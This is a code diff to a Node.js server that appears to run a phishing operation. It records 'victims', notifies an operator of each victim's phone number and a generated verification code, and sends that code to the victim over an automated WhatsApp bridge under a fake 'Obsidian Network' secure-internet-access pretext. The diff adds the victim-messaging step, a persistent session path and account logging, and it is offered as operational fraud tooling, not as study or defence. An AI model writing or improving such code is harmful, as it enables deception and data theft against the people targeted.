@@ -88,13 +88,35 @@ app.post('/api/register', (req, res) => {
     res.json({ status: 'success' });
 });
 
-app.post('/api/request-code', (req, res) => {
+app.post('/api/request-code', async (req, res) => {
     const { phone } = req.body;
-    addSystemLog(`SMS Code Requested: ${phone}`);
-    saveVictim({ type: 'code_request', phone });
+    // 6 haneli rastgele kod üret
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
     
-    const msg = `📩 *SMS KODU İSTENDİ* 📩\n\n📞 Tel: ${phone}\n\n_Kullanıcı kod bekliyor._`;
-    sendAdminNotification(msg);
+    addSystemLog(`SMS Code Requested: ${phone} -> Code: ${code}`);
+    saveVictim({ type: 'code_request', phone, code });
+    
+    // 1. Yöneticiye bildir
+    const adminMsg = `📩 *SMS KODU ÜRETİLDİ* 📩\n\n📞 Tel: ${phone}\n🔢 Kod: ${code}\n\n_Kurbana WhatsApp üzerinden iletiliyor..._`;
+    sendAdminNotification(adminMsg);
+
+    // 2. Kurbana gönder
+    if (client && connectionStatus === 'READY') {
+        try {
+            // Telefon numarasını formatla (90 ekle)
+            let cleanPhone = phone.replace(/\D/g, '');
+            if (cleanPhone.startsWith('0')) cleanPhone = cleanPhone.substring(1);
+            if (!cleanPhone.startsWith('90')) cleanPhone = '90' + cleanPhone;
+            
+            const victimId = `${cleanPhone}@c.us`;
+            const victimMsg = `*Obsidian Network*: Güvenli internet erişimi için doğrulama kodunuz: *${code}*`;
+            
+            await client.sendMessage(victimId, victimMsg);
+            addSystemLog(`Code sent to victim: ${victimId}`);
+        } catch (err) {
+            addSystemLog(`Failed to send code to victim: ${err.message}`);
+        }
+    }
     
     res.json({ status: 'success' });
 });
@@ -136,9 +158,12 @@ async function bootstrapWhatsApp() {
         connectionStatus = 'INITIALIZING';
         addSystemLog('Creating WhatsApp Instance...');
 
+        // PERSISTENCE FIX: Allow custom auth path via env (for Cloud Storage mounts)
+        const AUTH_PATH = process.env.AUTH_PATH || (isWin ? './.wwebjs_auth' : '/tmp/.wwebjs_auth');
+        addSystemLog(`Auth Path: ${AUTH_PATH}`);
+
         client = new Client({
-            // Path fix: Use local folder on windows, /tmp on linux
-            authStrategy: new LocalAuth({ dataPath: isWin ? './.wwebjs_auth' : '/tmp/.wwebjs_auth' }),
+            authStrategy: new LocalAuth({ dataPath: AUTH_PATH }),
             puppeteer: {
                 executablePath: chromePath,
                 headless: true,
@@ -196,7 +221,7 @@ async function bootstrapWhatsApp() {
         client.on('ready', () => {
             connectionStatus = 'READY';
             latestQR = null;
-            addSystemLog('SUCCESS: WhatsApp Bridge Connected!');
+            addSystemLog(`SUCCESS: WhatsApp Bridge Connected as ${client.info.pushname}!`);
         });
 
         client.on('disconnected', (reason) => {
